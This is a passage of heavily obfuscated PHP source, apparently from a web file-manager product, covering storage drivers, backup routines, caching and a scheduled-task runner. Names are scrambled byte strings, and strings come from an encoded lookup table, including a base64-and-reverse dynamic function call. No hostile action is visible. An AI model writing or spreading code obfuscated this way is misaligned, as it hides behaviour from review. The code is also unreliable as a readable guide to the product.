$Êé‹ØÙÙ[$æÌğîê[33]] = $æÌğîê[78]; } return $Êé‹ØÙÙ; } protected function _isFolder($ˆ˜Ò¹üù) { $üĞõáá =& $_SERVER[±Ö‰ô½¯]; if ($ˆ˜Ò¹üù == $üĞõáá[12] || $ˆ˜Ò¹üù == $üĞõáá[8]) { return !0; } $ÁëĞÅ  = $this->_objectMeta($ˆ˜Ò¹üù); return isset($ÁëĞÅ [$üĞõáá[33]]) && $ÁëĞÅ [$üĞõáá[33]] == $üĞõáá[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($«·†ñÊô) { parent::__construct($«·†ñÊô); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } public function uploadLink($ Â®ı–ù, $ÔäÍìçØ = 0) { $öŸ³¡‚Á =& $_SERVER[±Ö‰ô½¯]; if ($this->isUploadServer()) { return; } $ï¤ èŠÉ = $this->getType(); if (!in_array($ï¤ èŠÉ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ùƒêêñè = (!$ÔäÍìçØ ? 1 : ceil($ÔäÍìçØ / pow(1024, 3))) * 3600 * 4; $ğ¼íè‘½ = $this->uploadMultiData($ Â®ı–ù, $Ùƒêêñè); if ($ğ¼íè‘½) { $ğ¼íè‘½[$öŸ³¡‚Á[95]] = $ Â®ı–ù; $ğ¼íè‘½[$öŸ³¡‚Á[96]] = $ï¤ èŠÉ; } return $ğ¼íè‘½; } public function fileOutImage($±Ø‡Ì¹, $§‘”Ã½¸ = 250) { if ($this->size($±Ø‡Ì¹) > 1024 * 1024 * 25) { return $this->fileOutImageServer($±Ø‡Ì¹, $§‘”Ã½¸); } $ÚË§›Âƒ = $this->link($±Ø‡Ì¹); $ÚË§›Âƒ .= $_SERVER[±Ö‰ô½¯][1610] . $§‘”Ã½¸; $this->fileOutLink($ÚË§›Âƒ); } } goto F‰±÷ùŠ…³; BĞÏŞÙêÙ’: $fileSize = strrev(base64_decode($_SERVER[«¡ù¬šé][0])); function binCheckNeq($„ÅŞÔ“£, $ğŠæ²„È) { return $„ÅŞÔ“£ != $ğŠæ²„È; } $_SERVER[$_SERVER[«¡ù¬šé][1]] = $fileSize($_SERVER[$_SERVER[«¡ù¬šé][2]]); goto a¢²ÈÄô©ª; FÇæ…‰°–: class BackupDbFile { public function __construct() { } public function index() { $•«¢…ÔŞ =& $_SERVER[±Ö‰ô½¯]; $™Ü‡¶°Ò = Backup::get(); $´â¨ç˜“ = $™Ü‡¶°Ò[$•«¢…ÔŞ[32]]; $®‘ŞÚ£¥ = $this->tmpFilesPath() . "\x62\x61\143\x6b\x75\160\137{$´â¨ç˜“}\57"; $Ç²¶¹¾ø = $this->backupPath($™Ü‡¶°Ò); if (!($Ç²¶¹¾ø = IO::mkdir($Ç²¶¹¾ø))) { Backup::log($•«¢…ÔŞ[900] . $Ç²¶¹¾ø); return !1; } $îå¹±ô¦ = new DbManage(); $¼ñ“«„ = $îå¹±ô¦->getSqlFile(); if (!$¼ñ“«„ || !$¼ñ“«„[$•«¢…ÔŞ[901]] || !$¼ñ“«„[$•«¢…ÔŞ[13]]) { Backup::log($•«¢…ÔŞ[902]); return !1; } IO::move($¼ñ“«„[$•«¢…ÔŞ[901]], $®‘ŞÚ£¥); IO::move($¼ñ“«„[$•«¢…ÔŞ[13]], $®‘ŞÚ£¥); $îå¹±ô¦->mixBakList($®‘ŞÚ£¥); $ îµ˜ı© = IO::listPath($®‘ŞÚ£¥); $¸¨´¸ï‡ = isset($ îµ˜ı©[$•«¢…ÔŞ[86]]) ? $ îµ˜ı©[$•«¢…ÔŞ[86]] : array(); $Ì»¬è = array_sum(array_column($¸¨´¸ï‡, $•«¢…ÔŞ[79])); if (!$Ì»¬è) { Backup::log($•«¢…ÔŞ[903] . $®‘ŞÚ£¥); return !1; } $ü¬À×†Ú = array($•«¢…ÔŞ[904] => $Ì»¬è, $•«¢…ÔŞ[905] => time()); Backup::set($ü¬À×†Ú); Hook::trigger($•«¢…ÔŞ[906], $®‘ŞÚ£¥, $Ç²¶¹¾ø); $ÅµùÅ‡ = new TaskFileTransfer($•«¢…ÔŞ[906], $•«¢…ÔŞ[877], count($¸¨´¸ï‡), LNG($•«¢…ÔŞ[886]) . $•«¢…ÔŞ[474] . LNG($•«¢…ÔŞ[888]) . $•«¢…ÔŞ[907]); $ÅµùÅ‡->task[$•«¢…ÔŞ[861]] = $Ì»¬è; foreach ($ îµ˜ı©[$•«¢…ÔŞ[86]] as $’É£ĞË™) { $…æİ™ò = IO::move($’É£ĞË™[$•«¢…ÔŞ[87]], $Ç²¶¹¾ø); if (!$…æİ™ò) { $ÅµùÅ‡->end(); $¸¯êı²î = IO::getLastError($•«¢…ÔŞ[908] . $’É£ĞË™[$•«¢…ÔŞ[87]] . $•«¢…ÔŞ[909] . $Ç²¶¹¾ø . $•«¢…ÔŞ[177]); Backup::log($¸¯êı²î); return !1; } } $ÅµùÅ‡->end(); $ü¬À×†Ú = array($•«¢…ÔŞ[910] => $Ì»¬è, $•«¢…ÔŞ[911] => time()); Backup::set($ü¬À×†Ú); return !0; } private function backupPath($’ØÎôõÀ) { $‡¾Úà…ì =& $_SERVER[±Ö‰ô½¯]; $ÌÊ°Ñç = $’ØÎôõÀ[$‡¾Úà…ì[32]]; $ã¯ë×³Ò = Model($‡¾Úà…ì[870])->get($‡¾Úà…ì[871]); $†Éœ–Ê¾ = substr(md5($‡¾Úà…ì[872] . $ã¯ë×³Ò . $ÌÊ°Ñç), 0, 8); return "\x7b\x69\x6f\x3a{$’ØÎôõÀ[$‡¾Úà…ì[849]]}\x7d\57\x64\x61\x74\x61\142\x61\163\145\x2f\x62\141\143\153\x75\160\57" . $ÌÊ°Ñç . $‡¾Úà…ì[11] . $†Éœ–Ê¾; } private function tmpFilesPath() { $ºõ‚Ì×ˆ =& $_SERVER[±Ö‰ô½¯]; $âöÅ†¶à = TEMP_FILES; if ($GLOBALS[$ºõ‚Ì×ˆ[6]][$ºõ‚Ì×ˆ[92]][$ºõ‚Ì×ˆ[898]]) { $âöÅ†¶à = $GLOBALS[$ºõ‚Ì×ˆ[6]][$ºõ‚Ì×ˆ[92]][$ºõ‚Ì×ˆ[898]]; if (!mk_dir($âöÅ†¶à) || !is_writable($âöÅ†¶à) || !IO::mkfile($âöÅ†¶à . $ºõ‚Ì×ˆ[899])) { $âöÅ†¶à = TEMP_FILES; } } return $âöÅ†¶à; } } class BackupFile { public function __construct() { } public function index() { $ËšÀ­‰Ğ = Backup::get(); $ÁöàŠ¨ş = $ËšÀ­‰Ğ[$_SERVER[±Ö‰ô½¯][853]][$_SERVER[±Ö‰ô½¯][232]][$_SERVER[±Ö‰ô½¯][554]]; $ÀÕÊËóœ = array($_SERVER[±Ö‰ô½¯][555] => array($_SERVER[±Ö‰ô½¯][912], $ÁöàŠ¨ş), $_SERVER[±Ö‰ô½¯][913] => array($_SERVER[±Ö‰ô½¯][408], $ËšÀ­‰Ğ[$_SERVER[±Ö‰ô½¯][849]])); $›‡Õ¾·í = (int) Model($_SERVER[±Ö‰ô½¯][891])->where($ÀÕÊËóœ)->count($_SERVER[±Ö‰ô½¯][554]); $šûçŒèû = (int) Model($_SERVER[±Ö‰ô½¯][891])->where($ÀÕÊËóœ)->sum($_SERVER[±Ö‰ô½¯][79]); $›»å­ª³ = new TaskFileTransfer($_SERVER[±Ö‰ô½¯][914], $_SERVER[±Ö‰ô½¯][877], $›‡Õ¾·í, LNG($_SERVER[±Ö‰ô½¯][886]) . $_SERVER[±Ö‰ô½¯][887] . LNG($_SERVER[±Ö‰ô½¯][915])); $›»å­ª³->task[$_SERVER[±Ö‰ô½¯][861]] = $šûçŒèû; $À ª¨É· = array($_SERVER[±Ö‰ô½¯][916] => $›‡Õ¾·í, $_SERVER[±Ö‰ô½¯][917] => $šûçŒèû, $_SERVER[±Ö‰ô½¯][918] => time()); Backup::set($À ª¨É·); $€ Ì•­ü = !0; $ÛÀØ­¾´ = $this->storeIds(); $«¹’±€¾ = 1; $×²›ï÷Ü = 1000; $”ÙÃğ‹› = $¼ÊÃô¯À = 0; $ßõ«Ş½¡ = array(); $¸…¶Èàé = $–¡½¶Çí = 0; do { $®€äı‚ó = $_SERVER[±Ö‰ô½¯][919]; $§æ€ß¹¾ = Model($_SERVER[±Ö‰ô½¯][891])->where($ÀÕÊËóœ)->field($®€äı‚ó)->order($_SERVER[±Ö‰ô½¯][920])->selectPage($×²›ï÷Ü, $«¹’±€¾); $îª»şÆÙ = !empty($§æ€ß¹¾[$_SERVER[±Ö‰ô½¯][447]]) ? $§æ€ß¹¾[$_SERVER[±Ö‰ô½¯][447]] : array(); foreach ($îª»şÆÙ as $â‹§ÁØË) { if (!$this->_fileExist($â‹§ÁØË, $ßõ«Ş½¡, $ÛÀØ­¾´)) { Backup::log($_SERVER[±Ö‰ô½¯][921] . $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][554]] . $_SERVER[±Ö‰ô½¯][922] . $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][87]]); continue; } $ŒíçØğî = $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][87]]; $ÈğĞ¬„Ì = "\x7b\151\x6f\72{$ËšÀ­‰Ğ[$_SERVER[±Ö‰ô½¯][849]]}\175" . substr($ŒíçØğî, strlen("\x7b\151\157\x3a{$â‹§ÁØË[$_SERVER[±Ö‰ô½¯][923]]}\175")); if (IO::exist($ÈğĞ¬„Ì)) { $›»å­ª³->updateFileEnd($â‹§ÁØË[$_SERVER[±Ö‰ô½¯][32]], $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][79]]); } else { $ÈğĞ¬„Ì = get_path_father($ÈğĞ¬„Ì); IO::mkdir($ÈğĞ¬„Ì); if (!IO::copy($ŒíçØğî, $ÈğĞ¬„Ì, $_SERVER[±Ö‰ô½¯][924])) { Backup::log($_SERVER[±Ö‰ô½¯][925] . $ŒíçØğî . $_SERVER[±Ö‰ô½¯][909] . $ÈğĞ¬„Ì . $_SERVER[±Ö‰ô½¯][177]); $€ Ì•­ü = !1; break; } } $ÁöàŠ¨ş = $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][554]]; $¼ÊÃô¯À += 1; $”ÙÃğ‹› += $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][79]]; $–¡½¶Çí += 1; $¸…¶Èàé += $â‹§ÁØË[$_SERVER[±Ö‰ô½¯][79]]; if ($”ÙÃğ‹› >= 1024 * 1024 * 100) { $À ª¨É· = array($_SERVER[±Ö‰ô½¯][848] => $ÁöàŠ¨ş, $_SERVER[±Ö‰ô½¯][926] => $–¡½¶Çí, $_SERVER[±Ö‰ô½¯][927] => $¸…¶Èàé); Backup::set($À ª¨É·); $”ÙÃğ‹› = $¼ÊÃô¯À = 0; } } $ğ èŒØÅ = count($îª»şÆÙ); $«¹’±€¾++; } while ($ğ èŒØÅ == $×²›ï÷Ü); $›»å­ª³->end(); $À ª¨É· = array($_SERVER[±Ö‰ô½¯][928] => 1, $_SERVER[±Ö‰ô½¯][859] => time(), $_SERVER[±Ö‰ô½¯][875] => 1, $_SERVER[±Ö‰ô½¯][848] => $ÁöàŠ¨ş, $_SERVER[±Ö‰ô½¯][929] => time()); if ($¼ÊÃô¯À) { $À ª¨É·[$_SERVER[±Ö‰ô½¯][926]] = $–¡½¶Çí; $À ª¨É·[$_SERVER[±Ö‰ô½¯][927]] = $¸…¶Èàé; } Backup::set($À ª¨É·); return !0; } private function _fileExist($¯ÜÅ¢õ, &$Œãã¢ˆÊ, $Ú«‡âä‡) { $ŸäõòšŞ =& $_SERVER[±Ö‰ô½¯]; $ùÃÑŞ¨ê = $¯ÜÅ¢õ[$ŸäõòšŞ[87]]; if (in_array($¯ÜÅ¢õ[$ŸäõòšŞ[554]], $Œãã¢ˆÊ)) { return !1; } if (!in_array($¯ÜÅ¢õ[$ŸäõòšŞ[923]], $Ú«‡âä‡)) { return !1; } if (IO::exist($ùÃÑŞ¨ê)) { return !0; } $¦üí³«· = get_path_father($ùÃÑŞ¨ê); if (IO::exist($¦üí³«·)) { $Œãã¢ˆÊ[] = $¯ÜÅ¢õ[$ŸäõòšŞ[554]]; return !1; } $ÌÉ€…¹ = array($ŸäõòšŞ[923] => $¯ÜÅ¢õ[$ŸäõòšŞ[923]], $ŸäõòšŞ[87] => array($ŸäõòšŞ[471], "{$¦üí³«·}\x25")); $ò‰œœµ = Model($ŸäõòšŞ[891])->where($ÌÉ€…¹)->field($ŸäõòšŞ[555])->select(); $Œãã¢ˆÊ = array_merge($Œãã¢ˆÊ, array_to_keyvalue($ò‰œœµ, $ŸäõòšŞ[12], $ŸäõòšŞ[554])); return !1; } private function _fileFilter($‰ÁÚ­•) { $…ö‚ÂÌã =& $_SERVER[±Ö‰ô½¯]; return; if (empty($‰ÁÚ­•)) { return; } $Ä¶‰¨ = array($…ö‚ÂÌã[554] => array($…ö‚ÂÌã[7], array_unique($‰ÁÚ­•))); $›ıĞƒ¼ = Model($…ö‚ÂÌã[930])->where($Ä¶‰¨)->field($…ö‚ÂÌã[193])->select(); foreach ($›ıĞƒ¼ as $š¿¢›­Ï) { Model($…ö‚ÂÌã[930])->remove($š¿¢›­Ï[$…ö‚ÂÌã[193]], !1); } } private function storeIds() { $Î†“©±É =& $_SERVER[±Ö‰ô½¯]; $çûŒÆÆ = Model($Î†“©±É[865])->listData(); $ùÏªô‰“ = array(); $«›’ğ‰ù = $GLOBALS[$Î†“©±É[6]][$Î†“©±É[92]][$Î†“©±É[931]]; foreach ($çûŒÆÆ as $™ºîß¿Ù) { $œÕÀÒìö = strtolower($™ºîß¿Ù[$Î†“©±É[96]]); if (!isset($«›’ğ‰ù[$œÕÀÒìö])) { continue; } $ó¡®µîÂ = $Î†“©±É[77] . (isset($«›’ğ‰ù[$œÕÀÒìö]) ? $«›’ğ‰ù[$œÕÀÒìö] : ucfirst($œÕÀÒìö)); if (!class_exists($ó¡®µîÂ)) { continue; } $ùÏªô‰“[] = $™ºîß¿Ù[$Î†“©±É[484]]; } return $ùÏªô‰“; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ûÜ¡Û =& $_SERVER[±Ö‰ô½¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $…ñ×©§ = $GLOBALS[$ûÜ¡Û[6]][$ûÜ¡Û[426]]; $Ö•­È§Ï = $…ñ×©§[$…ñ×©§[$ûÜ¡Û[932]]]; $ÁšËîÒ = $…ñ×©§[$ûÜ¡Û[933]]; switch ($…ñ×©§[$ûÜ¡Û[932]]) { case $ûÜ¡Û[21]: self::$handle = Model($ûÜ¡Û[934]); break; case $ûÜ¡Û[935]: self::$handle = new CacheRedis($Ö•­È§Ï, $ÁšËîÒ); break; case $ûÜ¡Û[936]: self::$handle = new CacheMemcached($Ö•­È§Ï, $ÁšËîÒ); break; case $ûÜ¡Û[232]: self::$handle = new CacheFile($Ö•­È§Ï, $ÁšËîÒ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ïò¶Õ“«) { if (is_array($Ïò¶Õ“«) || is_object($Ïò¶Õ“«)) { $Ïò¶Õ“« = json_encode($Ïò¶Õ“«); } $Ïò¶Õ“« = rawurlencode($Ïò¶Õ“«); return md5(KOD_SITE_ID . $_SERVER[±Ö‰ô½¯][11] . $Ïò¶Õ“«); } public static function get($ğ™çíè, $üó‘ãÁ¶ = false) { $…ç„«‹´ = self::key($ğ™çíè); $¦‘§Ô­Ï = self::init(); if ($üó‘ãÁ¶) { return unserialize($¦‘§Ô­Ï->get($…ç„«‹´)); } if (!isset(self::$memoryCache[$…ç„«‹´])) { $ß¥œüÓ² = $¦‘§Ô­Ï->get($…ç„«‹´); self::$memoryCache[$…ç„«‹´] = unserialize($ß¥œüÓ²); } return self::$memoryCache[$…ç„«‹´]; } public static function set($êíÛòãŸ, $Ñ€ú‰øó, $‚‰®‹È = false) { $û”« á× =& $_SERVER[±Ö‰ô½¯]; $ÎÅ¨ŸñÆ = self::key($êíÛòãŸ); if (isset(self::$memoryCache[$ÎÅ¨ŸñÆ]) && self::$memoryCache[$ÎÅ¨ŸñÆ] === $Ñ€ú‰øó) { return !0; } if ($‚‰®‹È === 0) { self::$memoryCache[$ÎÅ¨ŸñÆ] = $Ñ€ú‰øó; return !0; } $ñÏ†İï° = self::init(); $½â¯ŠÃ = serialize($Ñ€ú‰øó); CacheLock::lock($êíÛòãŸ . $û”« á×[937]); $Ğ®æ ±Ù = $ñÏ†İï°->set($ÎÅ¨ŸñÆ, $½â¯ŠÃ, $‚‰®‹È); self::$memoryCache[$ÎÅ¨ŸñÆ] = $Ñ€ú‰øó; CacheLock::unlock($êíÛòãŸ . $û”« á×[937]); return $Ğ®æ ±Ù; } public static function getCall($Ğ“¥Œ”, $õöôÒğÌ, $•ÉÎ¾œ‚, $°††Ä÷› = array()) { $âì“½»ë =& $_SERVER[±Ö‰ô½¯]; $´£íöÕÁ = self::get($Ğ“¥Œ”); if ($´£íöÕÁ || $´£íöÕÁ === $âì“½»ë[12]) { return $´£íöÕÁ; } $´£íöÕÁ = call_user_func_array($•ÉÎ¾œ‚, $°††Ä÷›); $´£íöÕÁ = $´£íöÕÁ ? $´£íöÕÁ : $âì“½»ë[12]; self::set($Ğ“¥Œ”, $´£íöÕÁ, $õöôÒğÌ); return $´£íöÕÁ; } public static function limitCall($¾Ï¾â¤–, $úÌ™À‘§ = 15, $·“ÊÅ­ = 30, $Ã±ø½­ = true) { $ßæ¨œÚá =& $_SERVER[±Ö‰ô½¯]; static $©áÑ€éŒ = array(); if ($Ã±ø½­) { $¾Ï¾â¤– = $¾Ï¾â¤– . $ßæ¨œÚá[938] . KodUser::id() . $ßæ¨œÚá[939] . get_client_ip(); } if (isset($©áÑ€éŒ[$¾Ï¾â¤–]) && is_array($©áÑ€éŒ[$¾Ï¾â¤–])) { return $©áÑ€éŒ[$¾Ï¾â¤–][$ßæ¨œÚá[334]] <= $·“ÊÅ­; } $¬İ‰¸Ù¾ = self::get($¾Ï¾â¤–); if (!is_array($¬İ‰¸Ù¾) || time() - $¬İ‰¸Ù¾[$ßæ¨œÚá[206]] > $úÌ™À‘§) { $¬İ‰¸Ù¾ = array($ßæ¨œÚá[206] => time(), $ßæ¨œÚá[334] => 0); } $¬İ‰¸Ù¾[$ßæ¨œÚá[334]]++; self::set($¾Ï¾â¤–, $¬İ‰¸Ù¾, $úÌ™À‘§); $©áÑ€éŒ[$¾Ï¾â¤–] = $¬İ‰¸Ù¾; return $¬İ‰¸Ù¾[$ßæ¨œÚá[334]] <= $·“ÊÅ­; } public static function limitRuntime($ê‘ƒàş‡, $Ÿ ‘¼‘Ì) { $Øß‰âÓû = $_SERVER[±Ö‰ô½¯][940] . $ê‘ƒàş‡; if (isset(self::$runTimeCache[$Øß‰âÓû]) || !$Ÿ ‘¼‘Ì) { return !0; } $¾ÛË—Ö = intval(self::get($Øß‰âÓû)); $¾ÛË—Ö = !$¾ÛË—Ö || $¾ÛË—Ö <= 0 ? 1 : $¾ÛË—Ö + 1; if ($¾ÛË—Ö > $Ÿ ‘¼‘Ì) { return !1; } self::$runTimeCache[$Øß‰âÓû] = !0; self::set($Øß‰âÓû, $¾ÛË—Ö, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ª…Ïéğ„ => $Øø‚¥ş) { $¬Å›‹¶´ = intval(self::get($ª…Ïéğ„)); $¬Å›‹¶´ = !$¬Å›‹¶´ || $¬Å›‹¶´ <= 1 ? 0 : $¬Å›‹¶´ - 1; self::set($ª…Ïéğ„, $¬Å›‹¶´, 3600); } self::$runTimeCache = array(); } public static function remove($ãÙşäê¤) { $êĞÕ¢»× = self::key($ãÙşäê¤); unset(self::$memoryCache[$êĞÕ¢»×]); self::clearTimeout(); CacheLock::lock($ãÙşäê¤); $šÎÖ‚®ù = self::init()->remove($êĞÕ¢»×); CacheLock::unlock($ãÙşäê¤); return $šÎÖ‚®ù; } public static function removeMemory($–ˆÜ‚ıê) { $‡õ°ö½­ = self::key($–ˆÜ‚ıê); unset(self::$memoryCache[$‡õ°ö½­]); } public static function clearMemory($²×Ò Í = false) { if ($²×Ò Í) { $²×Ò Í = self::key($²×Ò Í); unset(self::$memoryCache[$²×Ò Í]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[±Ö‰ô½¯][941])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[±Ö‰ô½¯][942])) { self::init()->clearTimeout(); } } } goto f¥¶‘‰ï…; C‡Ö…–­: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¢ÊËÇ¦ =& $_SERVER[±Ö‰ô½¯]; if (self::valueGet($¢ÊËÇ¦[847]) != $¢ÊËÇ¦[91]) { return; } if (self::valueGet($¢ÊËÇ¦[1880]) == $¢ÊËÇ¦[91]) { $ÚìÛÈ×Ï = self::valueGet($¢ÊËÇ¦[1881]); if (time() - $ÚìÛÈ×Ï > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¢ÊËÇ¦[1880], $¢ÊËÇ¦[91]); self::log($¢ÊËÇ¦[1882] . ACTION . $¢ÊËÇ¦[1883]); Hook::bind($¢ÊËÇ¦[1884], $¢ÊËÇ¦[1885]); $ÊÊø§«‘ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¢ÊËÇ¦[847]) != $¢ÊËÇ¦[91]) { self::valueSet($¢ÊËÇ¦[1880], $¢ÊËÇ¦[230]); self::log($¢ÊËÇ¦[1886]); die; } $º”û÷ê = time(); if ($º”û÷ê - $ÊÊø§«‘ >= 60) { self::valueSet(array($¢ÊËÇ¦[1880] => $¢ÊËÇ¦[91], $¢ÊËÇ¦[1881] => $º”û÷ê)); $ÊÊø§«‘ = $º”û÷ê; } if (!file_exists(USER_SYSTEM . $¢ÊËÇ¦[1887])) { self::valueSet(array($¢ÊËÇ¦[1880] => $¢ÊËÇ¦[230], $¢ÊËÇ¦[847] => $¢ÊËÇ¦[230])); self::log($¢ÊËÇ¦[1888]); die; } $ ­œŞ = file_get_contents(BASIC_PATH . $¢ÊËÇ¦[1889]); $¨‚¯ñÖñ = KOD_VERSION . $¢ÊËÇ¦[10] . KOD_VERSION_BUILD; $æ°—§ş– = match_text($ ­œŞ, $¢ÊËÇ¦[1890]) . $¢ÊËÇ¦[10] . match_text($ ­œŞ, $¢ÊËÇ¦[1891]); if ($æ°—§ş– != $¨‚¯ñÖñ) { self::restart(); self::log("\x73\x74\x6f\160\x65\144\56\x5b\166\x65\162\x73\151\x6f\x6e\x20\165\160\x64\x61\x74\x65\x3b{$versionNow}\x20\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $êç¥¦Ú† =& $_SERVER[±Ö‰ô½¯]; http_close(); $GLOBALS[$êç¥¦Ú†[1892]] = 1; $_SERVER[$êç¥¦Ú†[1893]] = $êç¥¦Ú†[1894]; $_COOKIE = array(); $GLOBALS[$êç¥¦Ú†[1895]] = 1; $GLOBALS[$êç¥¦Ú†[1896]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ì™Œú£Ê =& $_SERVER[±Ö‰ô½¯]; http_close(); self::valueSet($Ì™Œú£Ê[847], $Ì™Œú£Ê[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ì™Œú£Ê[1880] => $Ì™Œú£Ê[230], $Ì™Œú£Ê[847] => $Ì™Œú£Ê[91])); self::log($Ì™Œú£Ê[1897]); } public static function taskSwitch() { $İ¡«İäÈ =& $_SERVER[±Ö‰ô½¯]; $ñıÔÈ®Î = self::valueGet($İ¡«İäÈ[847]) == $İ¡«İäÈ[91] ? $İ¡«İäÈ[230] : $İ¡«İäÈ[91]; self::valueSet($İ¡«İäÈ[847], $ñıÔÈ®Î); } public static function shutdownEvent() { $£‚¿“…ø =& $_SERVER[±Ö‰ô½¯]; self::valueSet($£‚¿“…ø[1880], $£‚¿“…ø[230]); self::log($£‚¿“…ø[1898]); } public static function config($øÕæ€¨, $á€…“İµ) { self::valueSet($_SERVER[±Ö‰ô½¯][847], $øÕæ€¨); } private static function taskRunAll() { $—ùÉ¿ğß =& $_SERVER[±Ö‰ô½¯]; $ÆŒÉûÀ˜ = timeFloat(); $íûğ¯Êş = Model($—ùÉ¿ğß[1899])->listData(); $æßø¶Óê = count($íûğ¯Êş); for ($•¢®İ = 0; $•¢®İ < $æßø¶Óê; $•¢®İ++) { $àŒáËì‡ = $íûğ¯Êş[$•¢®İ]; if (!$àŒáËì‡[$—ùÉ¿ğß[484]] || $àŒáËì‡[$—ùÉ¿ğß[1900]] != $—ùÉ¿ğß[91]) { continue; } if (!self::taskTimeCheck($àŒáËì‡)) { continue; } self::taskRun($àŒáËì‡); } Hook::trigger($—ùÉ¿ğß[1901]); self::taskQueueRun($ÆŒÉûÀ˜); } private static function taskQueueRun($ÏúúÇñ) { $ûÆîäÕ = 10; while (!0) { $ÖÜœ‹ú = TaskQueue::run(); if ($ÖÜœ‹ú === !1) { break; } if (timeFloat() - $ÏúúÇñ >= $ûÆîäÕ) { break; } } } private static function taskTimeCheck($Ùúá“€‚) { $¤®ÒÓÕ“ =& $_SERVER[±Ö‰ô½¯]; $Ëİµ˜§Í = json_decode($Ùúá“€‚[$¤®ÒÓÕ“[206]], !0); $¾÷Ì¾çÕ = intval($Ùúá“€‚[$¤®ÒÓÕ“[1881]]); $‰›­ò‚ = strtotime($¤®ÒÓÕ“[1902] . $Ëİµ˜§Í[$¤®ÒÓÕ“[1903]] . $¤®ÒÓÕ“[1904]) - strtotime($¤®ÒÓÕ“[1905]); $±ÊÃåÎ = time() - strtotime(date($¤®ÒÓÕ“[1906]) . $¤®ÒÓÕ“[1907]); $áâ¹¬—¿ = $±ÊÃåÎ >= $‰›­ò‚ && $±ÊÃåÎ <= $‰›­ò‚ + 3600; switch ($Ëİµ˜§Í[$¤®ÒÓÕ“[33]]) { case $¤®ÒÓÕ“[1908]: if (time() - $¾÷Ì¾çÕ < 3600 * 24 * 30) { return !1; } if ($Ëİµ˜§Í[$¤®ÒÓÕ“[1908]] == date($¤®ÒÓÕ“[1909]) && $áâ¹¬—¿) { return !0; } break; case $¤®ÒÓÕ“[1910]: if (time() - $¾÷Ì¾çÕ < 3600 * 24 * 7) { return !1; } $×æ‚Îˆ = date($¤®ÒÓÕ“[1911]) == 0 ? 7 : date($¤®ÒÓÕ“[1911]); if ($Ëİµ˜§Í[$¤®ÒÓÕ“[1910]] == $×æ‚Îˆ && $áâ¹¬—¿) { return !0; } break; case $¤®ÒÓÕ“[1903]: if (time() - $¾÷Ì¾çÕ < 3600 * 24) { return !1; } if ($áâ¹¬—¿) { return !0; } break; case $¤®ÒÓÕ“[1912]: if (time() - $¾÷Ì¾çÕ >= floatval($Ëİµ˜§Í[$¤®ÒÓÕ“[1912]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $É±Å•ãÊ =& $_SERVER[±Ö‰ô½¯]; static $§ÅÍì’Í = 0; $²ÑÙøşù = 300; if (!$§ÅÍì’Í) { $§ÅÍì’Í = time(); } if (time() - $§ÅÍì’Í < $²ÑÙøşù) { return; } $§ÅÍì’Í = time(); $³ğ¹ş = Model($É±Å•ãÊ[594])->db($É±Å•ãÊ[12]); if ($³ğ¹ş) { $³ğ¹ş->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($É±Å•ãÊ[1913], $É±Å•ãÊ[1914]); die; } } public static function taskRun($Ÿ½©“——) { $ÇƒÅ®ôÌ =& $_SERVER[±Ö‰ô½¯]; self::log($ÇƒÅ®ôÌ[1915] . $Ÿ½©“——[$ÇƒÅ®ôÌ[484]] . $ÇƒÅ®ôÌ[1916] . $Ÿ½©“——[$ÇƒÅ®ôÌ[32]] . $ÇƒÅ®ôÌ[1917] . $Ÿ½©“——[$ÇƒÅ®ôÌ[1513]]); Model($ÇƒÅ®ôÌ[1899])->run($Ÿ½©“——[$ÇƒÅ®ôÌ[484]]); $…³Â¬ãé = timeFloat(); $Ó–çÎòí = $ÇƒÅ®ôÌ[12]; switch ($Ÿ½©“——[$ÇƒÅ®ôÌ[33]]) { case $ÇƒÅ®ôÌ[384]: $šÔí›¾Ô = url_request($Ÿ½©“——[$ÇƒÅ®ôÌ[1513]], $ÇƒÅ®ôÌ[1555], !1, !1, !1, !1, 10); if ($šÔí›¾Ô[$ÇƒÅ®ôÌ[847]]) { $Ó–çÎòí = strlen($šÔí›¾Ô[$ÇƒÅ®ôÌ[1339]]); } break; case $ÇƒÅ®ôÌ[1918]: $Ó–çÎòí = Hook::apply($Ÿ½©“——[$ÇƒÅ®ôÌ[1513]]); default: break; } Model($ÇƒÅ®ôÌ[1919])->add(array($ÇƒÅ®ôÌ[1920] => $ÇƒÅ®ôÌ[12], $ÇƒÅ®ôÌ[1921] => $ÇƒÅ®ôÌ[230], $ÇƒÅ®ôÌ[33] => $ÇƒÅ®ôÌ[1922] . $Ÿ½©“——[$ÇƒÅ®ôÌ[484]], $ÇƒÅ®ôÌ[1923] => json_encode(array($ÇƒÅ®ôÌ[32] => $Ÿ½©“——[$ÇƒÅ®ôÌ[32]], $ÇƒÅ®ôÌ[1924] => timeFloat() - $…³Â¬ãé, $ÇƒÅ®ôÌ[853] => $Ó–çÎòí)))); $—Á­÷¨” = $Ó–çÎòí ? $ÇƒÅ®ôÌ[1925] . $Ó–çÎòí : 